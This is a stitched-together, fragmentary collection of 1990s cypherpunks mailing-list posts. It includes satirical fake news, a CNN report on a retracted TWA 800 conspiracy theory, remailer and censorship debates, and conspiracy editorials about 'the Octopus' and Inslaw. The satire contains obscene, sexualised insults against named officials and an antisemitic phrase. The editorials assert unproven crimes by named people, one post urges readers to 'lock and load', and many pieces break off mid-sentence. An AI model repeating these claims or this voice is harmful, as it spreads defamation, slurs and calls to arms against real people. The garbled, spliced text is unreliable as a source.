Philip R. Zimmerman, former head of PGP, Inc., announced his new
position as Publicity Representative for 'New Reality Productions'
by saying, "Daddy always told me, 'If you're going to sell out a
little, you might as well sell out a lot--and make the BIG bucks.'"
PRZ told gathered reporters that the increasing interest shown by
television viewers in shows such as 'The World's Scariest Police
Chases' threatened the growing popularity of the InterNet as the
medium of the future.
Zimmerman said, "The virtual reality of TV and the movies has always
been a harbringer of the virtual future. The success of Terminal Man
showed that the future was in snuff-flicks, and Police Chases was
the natural movement of that theme into the trend toward Real TV."
PRZ added, "The InterActive capabilities of the InterNet will allow
the Gates/Springer merger to give the viewers the ability to get
personally involved in the decisions as to who lives and who dies."
New technologies which enable law enforcement agencies to activate
kill-switches in fleeing automobiles have been abandoned in favor
of technologies which allow the home viewer to use joysticks to control the movement of the criminal's vehicle and those of their
police pursuers.
Zimmerman defended the use of the new technology by saying, "Sure,
snuff-flicks used to be illegal, but so did gambling and drinking.
'New Reality Productions' is just following the money."
The beta-testing of the new technology took place on the CypherPunks
mailing list, where list subscribers were given the opportunity to
actively participate in the second 'moderation experiment' on the
list by using their accumulated Moral Majority Reputation Credits to kill undesirable posts to the list.
Chief CypherPunks Spokesperson, Jodi Hoffman, said that putting control of the list in the hands of the lowest common denominator
had stemmed the "downward spiral" of the mailing list and that
the Christian CypherPunks mailing list was a definite improvement
over the original non-Christian-Jew infested CDR list.
"Once we got rid of the Christkillers and the Commies," Hoffman
proclaimed, "the list postings trickled down to two or three a
day, but if it saves the life of just one child..."

Taxation and exemptions are, conceptually, no different than a
tribal agreement that those who bring home the deer will share

the evil spirits at bay has to do neither.
  When one strips the semantics from various cypherpunks posts, there is usually an underlying agreement that there should be
no 'free rides' and no 'oppressive burdens.' <-- generality>
  I believe that half of the disagreements on the cypherpunks list,
and the vast majority of disagreements in the world in general, are
the result of disputes over semantics, rather than beliefs.
  Revolutionary idea! Instead of calling for Churches to be subject
to the same oppressive taxation as the rest of us, call for the rest
of us to be given the same exemptions as Churches.

                    TWA missile theory co-author apologizes
     Salinger
  Says report was 'reckless'
     From Correspondent Christine Negroni
     November 5, 1997
     Web posted at: 2:05 p.m. EST (1905 GMT)
     NEW YORK (CNN) -- Ian Goddard, co-author of a report that claimed
     the U.S. Navy shot down TWA Flight 800, has told CNN that those
     charges were "reckless and a mistake."
     In a written statement to CNN, Goddard apologized to "all those in
     the Navy I have wrongfully accused" and to "those who believed in
     my efforts and who are now upset with me for my change of mind."
     Goddard co-authored the report with former ABC news reporter Pierre
     Salinger and a third man, Mike Sommers.
     Ian Goddard's statement to CNN:
     "While many witness accounts remain a mystery to me, I believe that
     my effort to pin the crash of TWA 800 on the Navy was reckless and
     a mistake. I apologize to all those in the Navy I have wrongfully
     accused. I also apologize to those who believed in my efforts and
     who are now upset with me for my change of mind. "We all need to
     put our support behind the families of the victims of TWA 800. Many
     who died left children behind who now need your support... Please
     give."
     National Transportation Safety Board spokesman Peter Goelz, on
     learning of the Goddard apology, said that Goddard had done real
     damage, particularly to the victims' families, by promoting charges
     that the Navy's "friendly fire" caused the July 1996 crash.
     "He has caused innumerable people great agony," Goelz said, adding
     that both the FBI and the NTSB had to spend time responding to what
     were basically groundless accusations.
     Joe Lychner of Houston, who lost his wife and two daughters in the
     crash, told CNN that Goddard and Salinger owe an explanation to the
     American public.
     The so-called Salinger report laid out an elaborate conspiracy
     theory that alleged a huge government cover-up following the TWA
     crash. Goddard had kept the theory alive on a Web site he created,
     which now appears to have been discontinued.
  "I just wanted to give the government a black eye by any means that looked
  opportune. TWA 800 was just a vehicle for my larger agenda."
    — Ian Goddard
     Goddard has recently E-mailed associates about his report. In those
     messages, Goddard called his support of the conspiracy theory "a
     big mistake," and said he only pursued the charges because he
     "wanted to give the government a black eye by any means that looked
     opportune."
     Goddard says he wanted to promote libertarian ideology by
     encouraging distrust of the government.
     CNN's Christine Negroni reports on the admission:
     icon 2 min. 30 sec. VXtreme video
     When contacted by CNN about Goddard's statement, Salinger said that
     he is moving on from his investigation into the TWA crash, although
     he did not retract any of his charges that a Navy missile brought
     down the 747. Salinger called FBI Deputy Director James Kallstrom
     last week and told him that he was giving up his probe.
     In his statement to CNN, Goddard asked that the public support the
     families of the victims of TWA 800 and that donations be made to
     the Flight 800 Family Relief Fund.
     TWA Flight 800 crashed off Long Island, killing all 230 people on
     board. The FBI and NTSB have not yet named an official cause of the
     accident.

@_subject: Tim May Guilty in OKC Bombing! 
Prosecution tries to link May, McVeigh through literature
BIENFAIT (CANADIAN NUTLY NEWS) -- Drunks testifying Wednesday in the Oklahoma City bombing trial said they found anti-government literature in the home of defendant Tim C. May that was similar to that found in the car of Timothy McVeigh.
A shitfaced Lying Fuck Louis J. Freeh said, "Pro-constitution,
anti-government, it's all the same crap."
One document referred to the government raid on the Branch
Davidian compound near Waco, Texas, and contained the Thomas
Jefferson quote: "The tree of liberty must be refreshed from time to time with the blood of patriots and tyrants." FBI agents snorting cocaine in the bathroom were heard to say
that they were looking into the possibility that John Doe might, in fact, be Thomas Jefferson.
The government has argued that McVeigh and May were
incensed over how federal agents handled the 1993
clash with the Branch Davidian cult in Waco in which 80 cult
members died.	
Lying Nazi Cunt Janet Reno testified that, to her knowledge, May and McVeigh were the only two people in the US who were angered by the FBI murder of men, women and children.
One document seized in Timothy C. May's house was
a copy of a March 15, 1993, letter published in The Wall Street
Journal that referred to Waco and "equates federal agents with
Nazi SS agents exterminating Jews in World War II." When prosecutors entered this as evidence, May broke down on
his bar stool and confessed.
"When they introduced the evidence that I read The Wall Street
Journal," May told Canadian Nutly News reportwhores, "I knew it
was only a matter of time until they linked me to Jim Bell, who
has been learning how to read from prison copies of the newpaper."
Rumors that May ratted out other readers of The Wall Street Journal
in return for a double-shot of Tequila could not be confirmed.
All political figures queried by Nutly News reportwhores denied
reading the terrorist rag, including its publishers.
The editor of The Wall Street Journal vehemently denied rumors that May had secretly named him as an avid reader of his own paper,
claiming, "Hell, I can't even read." He also added that Tim May
and Jim Bell were known to be Janet Reno's secret lovers, though
admitting that they did not fuck her with their own dicks.
Tomorrow: FBI investigating reports that a majority of Cypherpunks
  mailing list subscribers used letters of the English alphabet
  that were 'similar' to those used by May and Bell.

The prosecution could have mounted as good or better a case against

has suffered a fractured wrist and skull? No wonder they were so hot
to have the girl convicted.)
The Judge knows damn well that reasonable doubt was visibly established,
and I suspect he's trying to get everyone out of the mess as quickly
and easily as possible. Bell's case is different. He was villainized within the court system
and there was little chance of it going to trial, unless he managed
to find an attorney who never wanted to win another case.
Bell's public defender turned down outside offeres of assistance from
veteran attorneys, and Bell was kept under wraps.
My guess is that Bell was the first Cypherpunk to receive the coming

It's sort of ironic that these anti-privacy, anti-anonymity Nazi wannabes
complain about remailers which give their users privacy, then somehow expect that their own complaints will be kept hidden.  I rather syspect that Gary Burnore, Belinda Bryan, and Paul Pomes were rather shocked when Jeff Burchell decided to tell the whole story (unfortunately AFTER shutting down the Huge Cajones remailer).
Maybe the next time Gary, Linda, or Paul send a remailer operator a complaint,
the operator will know what to expect next.  I'm wondering if that's at least
part of what's behind the faux spam-baiting that's underway, with messages to
varios MMF, MLM, and alt.sex.* NGs whose title and body consist of randomly-
chosen words, followed by a list of bogus e-mail addresses in the body.  The
thing that's not so random is the high percentage of words that are related to
DataBasix, such as "DataBasix", "Burnore", and "Wotan".  I'm almost waiting for
Gary Burnore to give the remailer and mail2news operators a "helpful" suggestion
that they could curb most of this "abuse" by simply blocking any anonymous
posts containing any of those three keywords.   Or perhaps he's done so and
politely been turned down.
Perhaps the next wave of attacks on remailers will not consist of attempts to
shut them down altogether but to progressively cripple them by getting certain
features disabled, one by one.  This seems to have already started.  The strategy
seems to be to fabricate a form of "abuse", anonymously through remailers, for
which the seemingly "logical" solution is to disable a certain feature.  This has
already proven successful with header pasting, for example.  Now you can't post
to Usenet and set the From: address to that of your own 'nym.  I'm not even
certain that you can set a Reply-To: address any more.  If the "camel" can get
his nose under the tent and convince operators to start filtering on the *CONTENT*
of the Subject: line or body of usenet posts, the anti-privacy nuts will have
scored a major victory.  In fact, from reading Jeff Burchell's posts, it looks like
Gary and his DataBasux-ers had initially convinced Jeff to do exactly that.  But,
in a symbolic victory for freedom of speech, he removed those filters for a week
before he finally shut down Huge Cajones altogether.

Throwing the woman in jail for eight months without her ever being convicted
is itself an injustice. She should have been aquitted because of that bit of
bullshit alone. Yes the same goes for anybody else who is punished in any
way before they are convicted.
That aside, you ask what the point of having a jury is if the judge can
overturn a conviction. There's no problem with the judge overturning a
conviction if the evidence warrants it, if the trial was a joke, or
something along those lines. We don't convict people in this country based
on what the public thinks of them, and that includes a jury. If the jury
convicts somebody when the evidence doesn't warrant a conviction --
regardless of the reason why they convicted them, which may be as inane as
"But he *might* have been gay, and Jesus doesn't like that" -- it is the
judge's duty in the interests of justice to overturn the conviction.
If the judge is overturning aquittals, then we have problems. And I would
suggest we lock and load if the judge had done that and thrown her in prison.
As it is, I only suggest that everyone lock and load because they threw her
in jail before she was convicted. She hadn't yet had her trial, so she
shouldn't have been in jail, period.

Canadians have the additional problem of having a lot of software which
is customized to convert differing MM/DD/YY formats back and forth. More
so than many other countries, because of the close working relationship
of many small to medium companies with American customers and vendors.
Many Canadian companies do not seem to realize that their software works with their 'Joe America' software package only because the guy who left the company six years ago did some obscure customization. I have seen problems that appeared only when Canadian companies updated their 'Joe America' software, and that was _without_ date-code Many companies that run Canadian versions of software are also unaware
of the customizations made to it by vendors in order to 'make' it
work with US versions as it was advertised to do out of the box.
As well, even Canadian companies who are ready and willing to tackle
the Y2K problem are sometimes unable to do so until those who their
software needs to interact with do so. It is sometimes very difficult
for them to fix the 'Canadian' parts of the code without adjusting
the 'American' parts of the code, with no assurance that once their
American counterparts do their changes, all of their work/money goes
out the window.
During the decimal/metric changeover in Canada, I had more than one
car which required me to have tools for 'both' systems, to do even
the smallest of mechanical tasks on it.
Now might be a great time to invest in companies who resisted the
move to computerization, and who still have bookeepers and the

would double-park during rush hour and probably has connections to the
Illuminati, neo-Nazi hate groups, and the O.T.O.
The logical extreme of what you propose is that, for a serial murderer, jail
would just be a rest stop between killings. "He was caught in Idaho and
indicted for murder, but they released him on bail. So he went over to
Montana and killed someone there, but they had to release him, too."
Surely there must be some reasonable middle ground.

@_subject: Scared of US; Where to relocate? 
It has become very clear to me over the past few years that amerika is headed for some pretty rough times, and I've decided to leave before
it becomes illegal for me to do so. The only question is, where to?
I've been looking around for about a week, and the only country that's
looked good so far was Anguilla (lower travel costs for FC99!), but it
doesn't meet my requirements for a number of reasons...
Key features I'm looking for are:
1) Stable political environment. I'm making the move, after all, to AVOID
participation in a civil war.
2) Stable economy, with local sources for all the basics (food, water,
3) Reasonable level of medical technology, and local talent. I want good
care for my wife during childbirth, for instance.
4) A job market for unix sysadmins / networking gurus / hackers would be
nice, but I wouldn't mind learning a new trade either.
5) Right to keep & bear arms + Freedom of speech are musts, other
"bill of rights" type laws strongly desired.
6) Low or no taxes would be nice, but if the first five points are met
even a fairly high (30-40%) tax rate would be endurable.
So... any suggestions?

@_subject: NoneRe: Databasix conspiracy theories 
Jeff Burchell's systems, Mailmasher and Huge Cajones, seemed to bear the
brunt of the wrath and attacks by Gary Burnore and his associates Billy
McClatchie (aka "Wotan") and Belinda Bryan.  Perhaps that's because they
were most often utilized by one or more of his detractors in posting public
criticism about the tactics of himself, his company, and his associates.
IMO, that's a good policy.  In fact, the best strategy seems to be to have a
plan in place before starting a remailer so that when attacks and/or demands
come in, the operator will have already decided what responses are appropriate
and what aren't.  To fail to do that is to leave one's system open to
"designer abuse" where a certain kind of fabricated abuse implies a certain
"cure", which is exactly why the abuser did it in the first place.  For
example, if someone comes along and starts spamming newsgroups, seemingly at
random, and the common thread seems to be that each of the spams mentions
Gary Burnore or DataBasix, the "obvious" solution would seem to be block all
posts which include the keywords "Burnore" or "DataBasix".  By doing that, you
stop the abuse -- as well as effectively censoring any anonymous criticism of
Gary Burnore and DataBasix.  It's not hard to figure out the motives behind
such actions.
If I remember correctly, the documentation for at least one of the nymservers
suggested that posting through a remailer and pasting in the return address
would be quicker and impose less burden on the server than having to process
each outgoing message through the server.
I'm not sure that even that is a wise precedent to set.  In itself it seems
innocuous enough, but it could always lead to a demand, "Well, you already
mangle e-mail addresses contained in the bodies of posts, so why not also
alter the contents of posts in the following way..."
Also, I hope that your mangler is smart enough to distinguish e-mail addresses
from lists of Usenet message IDs, since a list of such references should be
perfectly valid in the body of a post.  The problem with destroying machine
readability of e-mail addresses is that many newsreaders will turn an e-mail
address into a hot link where one could simply click on it to send e-mail.  If
someone were to anonymously post a message in support of or in opposition to
a certain piece of legislation, and include a list of the e-mail addresses of
the Congress-critters on a certain committee considering that bill, such a
scheme might defeat the purpose of the list.  IMO, anything that makes posting
via a remailer less functional than doing so non-anonymously is ultimately
detrimental to the cause of privacy.
BTW, is there any evidence to indicate that anyone is really harvesting e-mail
addresses from the BODIES of Usenet posts?  Gary Burnore posts his flames quite
widely, so it's quite likely that any bulk e-mailing lists he's on is the
result of his (non-mangled) e-mail address being in the From: line of his own Perhaps the ultimate reality check is whether someone is seeking to impose a
standard on remailers that's stricter than the one imposed on the phone company
or the postal service.  I can drop some coins in a pay phone and call anyone at
any time.  The functionality of a public phone is not restricted merely because
the users are not identified.  Similarly, I can drop a letter in a public mailbox
without anyone verifying my identity.  No return address is required.  Or I can
write in a return address and nobody will check whether it's "genuine" or
"forged".  It would be ludicrous, for example, for someone who had received a
couple of crank phone calls from payphones to demand that the phone company
either totally prevent this abuse from ever happening again or else remove all of its pay phones!  And yet those are exactly the demands that anti-privacy zealots have made on remailers, and often they've succeeded.
Should one's willingness to broadcast his/her name and e-mail address indiscriminately to a WORLDWIDE newsgroup be a prerequisite for one to express
one's views?  Is that not tantamount to saying that one cannot walk down the
street without wearing a badge containing his name, address, and phone number for
all to read?  Or should one's name and e-mail address be considered his property
to be divulged only if and when he chooses?
Without censorship, things can get terribly confused in the public mind.

@_subject: CDA: The Sequel -- introduced in the U.S. Senate 
Oh joy.
 ^^^^^^^^^
What defines a "web site?" "The World Wide Web" originally meant "material
accessible using the HyperText Transfer Protocol." The media and Klintonkov
distorted the term into something else, but that's what the term still
means. USENET newsgroups do not become "Internet chat groups" just because
the clueless sheeple start calling them that. Of course this is how the
government thinks.
If I make a posting to USENET did I post the material on a "web site?" If I
make the material accessible via ftp is it posted on a "web site?" What if
it's available using FSP? How about IRC? What about a Bob's Proprietary
Pornography Transfer Protocol? How are they going to track this? What happens when I post this material on
an Eternity server outside of the U.S.? What if I just keep posting my porn
through the remailer network? What if the porn site is in Amsterdam? What if
I just get tired of the totalitarians and double-blind the entire process
using the remailer network and while I'm at it I accept anonymous payment?
What if I bring my porn into a public computer lab and upload it somewhere
without any identification or with a psuedonym? Is the P.Q.R.T. (Pornography
Quick Response Team) going to bust through the door before I've done this,
which takes all of about 30 seconds?
What happens when people start posting such porn to sci.chem? What about
sci.crypt or alt.christnet? What about misc.legal? comp.org.eff.talk?
news.groups? Is this bill available on the "World Wide Web?" I would argue that reading
this bill is "harmful to minors" because it completely ignores the
Constitution of the United States. Further, it encourages people to lie,
cheat, violate oaths of office, and generally abuse power. Senator Coats, what an example for America's youth!
What happens when they say "this material must be put behind a firewall?" Do
I comply with the letter of the law if I firewall some random port like
49554? What if I firewall everything except port 80? What if I use a
dedicated box as a network router and firewall? These things are all
Who determines what is a "valid firewall?" Microsoft? A Coats staffer? A
credit card company?
What happens when these credit card numbers are sent all over the network in
the clear? As it stands now you usually send a credit card number when you
want to buy something. What they want here is for everybody to go send
credit card numbers all over the net just to view free previews and get to
text-based information. And, of course, since we have to protect society
from the Four Horsemen, these credit card numbers will likely be sent in the
clear or using encryption which can be cracked by a college student running
a distributed cracker at idle priority on each of the several hundred
machines in a lab. And getting even *one* credit card number is worth a lot.
What prevents me from setting up a bogus site which asks for credit card
numbers to view some nudie pictures I pulled off USENET or other sites and
just storing the credit card numbers? How many of these people access just
one porn site so it would be that easy to track? How can anybody prove
that's what I did? Once handing credit card numbers out is as second nature
as SSNs, all bets are off.
And what happens when Little Johnny goes and gets Daddy's credit card and
uses the number as ID? If they aren't charging, this probably won't be
showing up on an invoice. And Little Johnny has plausible deniability
anyway. What about stolen credit card numbers?
Who determines what is "material harmful to minors?" Coats? The Supreme
Court? Psychologists? Scientologists? Klitonkov? The United Nations? My
hamster? Duncan McLeod of the Clan McLeod? Who?
Well, I guess this outlaws any meaningful political discussions, discussions
of abortions, any meaningful social discussions, any meaningful discussions
about sex or romance, any discussions about the prevention of sexually
transmitted diseases, any discussions of firearms, any discussions of
hand-to-hand combat, any discussions of self defense, any discussions of
guerilla warfare, any discussions of pyrotechnics, any discussions about
chemistry, lists like BUGTRAQ where exploits are posted, et cetera ad nauseum.
All of those things might be considered "harmful to minors." Damn the
Constitution and freedom! If it saves the life of one innocent yet
incredibly stupid child then just forget about that pesky freedom thing.
After all, that's only the domain of "far right-wing nazi gun nuts and
radicals," right?
Yeah! Go Senate! Go ahead and ban any digital copies of books like 1984 (oh
the irony!), digital versions of the Christian Bible, the Torah, et cetera
ad nauseum.
How are they going to enforce this one? Mandate that sites only serve
"government certified safe" or "independantly certified safe" sites? Turn
off all phone and network access, jam all radio and sattelite communications, and legislate that anybody caught with a laser capable of communications or
floppy disks with files on them which might contain stegoed data will be summarily executed?
"This bill will ensure that our freedoms are further eroded."
My fellow Cypherpunks, what we have here is best explained by an analogy
like this:
The government decides that the youth of America is corrupting themselves
and harming their health by drinking soft drinks. The Congress introduces
legislation to outlaw softdrinks. Everyone except the National Law Center
for Fruit and Vegetables and some other far flung totalitarians think that
this legislation is rediculous and an unreasonable restriction of rights. It
passes anyway. It goes to the Supreme Court and the Court shoots it down.
Two years later Congress again tries to outlaw soft drinks. Since outlawing
of soft drinks en masse was not allowed by the Supreme Court, they just
outlaw Coke. This passes. People start drinking Mountain Dew and JOLT
instead. The Justice Department brings charges against these drinkers, the
people who manufactured it, the people who sold it to them, and the truck
drivers who shipped it. It goes to court and the defendants claim that the
law wasn't broken. The State says that the law was indeed broken because
"everybody refers to soft drinks as Coke."
This, of course, begs the question of why, if "Coke" is a synonym for
"soft drinks" they passed a law after the Supreme Court clearly stated that
they couldn't do such. If "Coke" is not a synonym for "soft drink" then they
have no charge against these people. Welcome to the Land of the Freeh.

NETSCAPE PRODUCTS WITH FORTEZZA  Netscape is now offering client and server products with
 FORTEZZA, hardware-enhanced security services
 originally developed by the U.S. government. Netscape's
 offerings include Netscape Navigator 3.01 with
 FORTEZZA, Netscape Enterprise Server 2.01 with
 FORTEZZA, and Netscape Proxy Server 2.0 with
 FORTEZZA - each of which provides a unique web-based
 solution by integrating FORTEZZA security features in a
 commercially available, off-the-shelf package.  Netscape's products work with the FORTEZZA Crypto
 Card, a hardware-based security token, to provide
 cryptographic services such as data confidentiality, user
 authentication, and data integrity. Support for FORTEZZA
 has been added to the Secure Sockets Layer (SSL)
 protocol, which provides a straightforward way to add
 encryption features to existing applications and network
 infrastructures. SSL is application protocol independent and
 provides the following benefits:       encryption capabilities for client and server
      communication that restrict unwanted access to the
      network       authentication that uses certificates and digital
      signatures to verify the identity of parties in
      information exchanges and transactions       data integrity that allows the receiver of data to check
      that it has not been modified in transit  Netscape products with FORTEZZA support the use of
 FORTEZZA with SSL as an enhanced alternative to
 software-based cryptographic mechanisms.  The FORTEZZA Crypto Card is a major component of the
 MISSI program, a network security initiative led by the
 National Security Agency in partnership with industry and
 standards organizations. MISSI's goal is to distribute an
 evolving set of solutions that provide secure interoperability
 in a network security framework based on common security
 standards and protocols.  In addition, Netscape is working with information security
 specialist Litronic and others to develop, integrate, and
 support the FORTEZZA cryptographic interface. Litronic
 offers its FORTEZZA PC Crypto Card and PCMCIA
 Card Readers/Writers for use with the new Netscape
 products with FORTEZZA. Litronic is based in Costa
 Mesa, California and offers the software and hardware tools
 that organizations need to easily integrate hardware-strength
 cryptography into existing applications.  Netscape products with FORTEZZA are currently available

If you don't speak up when someone says something objectionable, you are
implicitly condoning it.  Silence gives consent.  How many people have
objected to Tim May's racist comments?  Only one or two.  How many objected
when William Geiger suggested that more nuclear bombs should have been
dropped on Japan?  None.  How many have objected to the notion that
residents of Washington, D.C. should be killed?  Hardly any.
At one time the cypherpunks stood for freedom of speech and protection of
privacy.  Today they stand for guns, violence, threats of terrorism and
murder, racism, homophobia, jingoism.
It's ironic to see that the kind of off-topic, flaming, irrelevant
posts which have caused such consternation in the past are now the norm.
Reasonable people have been largely driven off the list, leaving it to
supporters of violence and hate.
The sad thing is, this is all unnecessary.  The original conception was
that cryptography would allow people to protect the privacy of voluntary
interactions.  Laws forbidding voluntary transactions will be difficult
or impossible to enforce.  We will move into a world where there is far
more liberty and freedom for everyone.
There is no need to blast government agents' heads open.  There is no
need to nuke D.C., or Japan.  There is no need to disparage people of other
races and cultures.
Step back from this immersion in a culture of violence.  Draw the cloak

Another example of the violent rhetoric which goes without comment on
this list.
The death penalty is completely inappropriate for this kind of crime.
It should be reserved for the most serious of criminal actions, the most
egregious murders, terrorism, genocide.
An appropriate punishment for a judge who violates his oath of office
and sentences someone wrongly to prison would be a prison sentence for
the judge himself, some multiple of the unjust sentence.
Calling for the death penalty for crimes which do not themselves involve
killing only cheapens life.  Before long you too will support shooting
graffiti vandals and nuking London.

@_subject: What cypherpunks used to be 
Cypherpunks assume privacy is a good thing and wish there were more
of it.  Cypherpunks acknowledge that those who want privacy must
create it for themselves and not expect governments, corporations, or
other large, faceless organizations to grant them privacy out of
beneficence.  Cypherpunks know that people have been creating their
own privacy for centuries with whispers, envelopes, closed doors, and
couriers.  Cypherpunks do not seek to prevent other people from
speaking about their experiences or their opinions.
The most important means to the defense of privacy is encryption. To
encrypt is to indicate the desire for privacy.  But to encrypt with
weak cryptography is to indicate not too much desire for privacy.
Cypherpunks hope that all people desiring privacy will learn how best
to defend it.
Cypherpunks are therefore devoted to cryptography.  Cypherpunks wish
to learn about it, to teach it, to implement it, and to make more of
it.  Cypherpunks know that cryptographic protocols make social
structures.  Cypherpunks know how to attack a system and how to
defend it.  Cypherpunks know just how hard it is to make good
Cypherpunks love to practice.  They love to play with public key
cryptography.  They love to play with anonymous and pseudonymous mail
forwarding and delivery.  They love to play with DC-nets.  They love
to play with secure communications of all kinds.
Cypherpunks write code.  They know that someone has to write code to
defend privacy, and since it's their privacy, they're going to write
it.  Cypherpunks publish their code so that their fellow cypherpunks
may practice and play with it.  Cypherpunks realize that security is
not built in a day and are patient with incremental progress.
Cypherpunks don't care if you don't like the software they write.
Cypherpunks know that software can't be destroyed.  Cypherpunks know
that a widely dispersed system can't be shut down. This is why cypherpunks
itself is a distributed mailing list.
Cypherpunks will make the networks safe for privacy.

  You may not care if the whole world knows that you want information

  If a real 'Information Server' had a verifiable Public Key for
you to encrypt your reply to, then it would not likely matter if you
sent the message to a spoof address, as unknown recipients could
not likely read it. The same applies to your friends, relatives and
bussiness acquaintances. If you use encryption for those things
which are important for you to keep private, then you do not have
to worry as much if they share an email account, computer or system

IS FOSTER KEY TO "THE OCTOPUS?"
                          Editorial
    When you start digging into the circumstances surrounding the
death  of  White  House aide Vince Foster, a number of names keep
popping up that have popped up in relation to a number  of  large
scandals of the last two decades.
    Starting with the "October Surprise,"  the  alleged  plot  to
delay the release of hostages from Iran to after the presidential
election in 1980 in an attempt to embarrass President Carter,  it
is  indeed  striking  that  the hostages were released just a few
hours after President Reagan was sworn in.  A number of witnesses
have testified to the involvement of Vice President Bush and Earl
Brian in this secret plot. These witnesses,  all  CIA  or  Mossad
assets,  have  received the "Terry Reed treatment": indictment on
false charges and  thorough  discrediting.  But  it  was  another
source, White House staffer Barbara Honegger, who wrote the first
"October Surprise" book in 1989.
    It was early in the Reagan administration  that  Earl  Brian,
Richard Secord and others used their influence and connections to
make money on selling the pirated  PROMIS  software  from  Inslaw
Inc.  Former  OSS  agent Jackson Stephens is alleged to have made
money on PROMIS as well through his Arkansas Systematics Inc.  It
was  there  that Vince Foster, as a partner of Hillary Clinton in
the Rose Law Firm and representing Systematics,  became  involved
with the Inslaw affair.
    A much  bigger  scandal  of  government  corruption  was  the
Savings  and  Loan  scandal  of  the  1980.  The federally backed
savings-and-loans were not only looted by  crooks  and  criminals
but  also  by well-connected politicians who needed an easy buck.
Neil Bush and Bill and Hillary Clinton are just a few examples.
    Apparently not content with the hundreds of billions in S & L
loot  from  the  taxpayer, corrupt government officials turned to
drugs. The CIA-sponsored Contra re-supply  network  was  used  to
ship  illegal  drugs of incredible volume into the United States.
CIA assets Terry Reed and  L.D.  Brown  implicate  Bill  Clinton,
George  Bush and Oliver North with this operation. A confidential
CIA document obtained  by  the  Washington  Weekly  supports  the
involvement  of  George  Bush by linking him to arms-dealer Adnan
Khashoggi, Richard Secord, and CIA asset John Hull,  whose  ranch
in  Costa  Rica  was  used  for  transshipment  of drugs and arms
through Mena, Arkansas and other U.S. destinations.
    Another of these scandals during the 1980s  was  the  illegal
penetration of the bank that the CIA preferred - the BCCI Bank of
Crooks  and  Criminals.  Politicians  across  the  spectrum   are
implicated  in  taking  bribes  to  allow  this bank to take over
American banks with  the  help  of  Jackson  Stephens  and  Vince
Foster.  No serious investigations have been launched by the Bush
and Clinton Justice Departments.
    Leaving aside for a moment the dispute over  whether  any  of
these  scandals  have  been proven, there is one remarkable facet
about the facts as they have been presented: some names appear in
several of these alleged scandals.
    Topping the list is George Bush, the  only  CIA  director  to
become  President  of  the  United  States.  It  is  difficult to
reconcile these serious allegations with the rather decent public
image   of   George  and  Barbara  Bush.  But  to  dismiss  these
allegations out of hand is to accept a conspiracy that includes a
large  number  of unrelated witnesses naming the same culprits in
different scandals.
    But it  should  also  be  said  that  participants  in  these
scandals  may  have thought they acted to defeat Communism, where
the end would justify every means. After all, that was the  prime
objective of the CIA during the Cold War.
    Are these  the  arms  of  the  octopus  that  reporter  Danny
Casolaro  referred  to just before he was found dead in his hotel
room in 1991? He  told  friends  he  was  tracing  a  network  of
government  corruption  involving  Inslaw,  BCCI, and the October
Surprise. Washington D.C. attorney Paul Wilcher was  tracing  the
same Octopus when he was found dead three days after Vince Foster
    Think back to the 1992 elections for  a  moment.  Did  George
Bush  bring  up  any  of  the  scandals  that could have defeated
Clinton?  Did he mention  Whitewater,  Cattlegate,  Paula  Jones,
Gennifer  Flowers,  Mena?   Why  not?  Did  he know that it could
backfire seriously because of what Bill Clinton knew  about  him?
Did  Bill  Clinton take advantage of that in his unlikely bid for
the presidency?
    What, then, is this Octopus? It appears to be an  association
between  rogue elements of the CIA and certain elected officials.
An analysis of these structures  will  show  that  corruption  is
inevitable.  The CIA has a budget of $28 billion, it assassinates
people without being held accountable  in  a  court  of  law,  it
operates  in  secret,  it  has  almost unlimited power and is not
subject to any meaningful  oversight.  Only  saints  could  avoid
corruption and abuse of power in such an environment.
    Then what can we do about it? Limit the budget  of  the  CIA,
limit  its  role,  subject it to greater outside scrutiny, expose
past scandals and hold individuals responsible for their  crimes.
Three  presidents tried to do just that: John F. Kennedy, Richard
Nixon, and Jimmy Carter. None of them stayed in office for  long,
and none of them achieved their goal.

INSLAW SUMMARY
                         By Bill Hamilton
The following information has been given to each member of the House
Judicary Committee and was placed on the Internet in electronic form

supporting details may be obtained from:
    Inslaw
    1125 15th Street, NW
    Washington, DC 20005-2707
    Telephone (202) 828-8638
     One of the organizational units that reports to Mark Richard is
the Office of Special Investigations (OSI).  OSI's publicly-declared
mission is to locate and deport Nazi war criminals. The Nazi war
criminal program is, however, a front for the Justice Department's
own covert intelligence service, according to disclosures recently
made to INSLAW by several senior Justice Department career officials.
     One undeclared mission of this covert intelligence service has
been the illegal dissemination of the proprietary version of PROMIS,
according to information from reliable sources with ties to the U.S.
intelligence community.  INSLAW has, moreover, obtained a copy of a
27-page Justice Department computer printout, labelled "Criminal
Division Vendor List." That list is actually a list of the commercial
organizations and individuals who serve as "cutouts" for this secret
Justice Department intelligence agency, according to intelligence
community informants and a preliminary analysis of the computerized
list.  A significant proportion of the 100-plus companies on the list
appear to be in the computer industry.  The Justice Department's
secret intelligence agency also has its own "proprietary" company
that employs scores of agents of diverse nationalities, as well as
individuals who appear to be regular employees of various departments
and agencies of the U.S. Government or members of the U.S. Armed
Forces, according to several sources.

Unlike a blowhard do-nothing like Timothy "Chop-chop" May (and now we know

oppose PGP GAKware.  He has strong political views but is not motivated
by hatred and fear.
Adam doesn't get nearly the respect he deserves, probably because he's
not much of a wordsmith.  Tim May's sophistry is good enough to pull

contravention of every shred of decency and honor.  Such a bloodthirsty
act of revenge would have branded the U.S. as hopelessly barbaric, savage

Former Klan hotbed elects first black mayor
November 16, 1997
STONE MOUNTAIN, Georgia (AP) -- By the light of a blazing cross, the Ku
Klux Klan proclaimed its 20th century rebirth on the granite mountain
that gives the town its name. For decades, white-hooded Klansmen flocked
here for annual gatherings, and Confederate heroes are sculpted into
the side of the mountain.
Today, the mayor's office once held by an imperial wizard of the Klan
is about to be filled by a black man, who also lives in the former KKK
leader's house.
Elected with biracial support, Chuck Burris is more concerned about
getting new sidewalks and more police than with Stone Mountain's old
image of racial division.
Burris, a city councilman, defeated a six-year incumbent in the November
4 election and will lead a black majority City Council in January.
Campaign didn't focus on race
'We wanted the best-qualified candidate'
New mayor lives in house that belonged to Klan wizard
If the birthplace of the KKK can rise above its racial prejudice, is it
too much to ask the same of ourselves?

But seriously, there is something to be said for adopting a style of writing specific to a nym or group of nyms.  Anyone who has read The Economist magazine on various occasions knows how its language and tone are consistent, as if one author writes every article, issue after issue.  Having the writings of a nym "edited" by others as a way of foiling Stylometry -- the statistical analysis of literary style -- may prove to be a lucrative business if nyms ever gain wide use, especially if they are used in ecommerce where anonymity of the nym holder is paramount to avoid the wrath of the tax man in his physical jurisdiction.
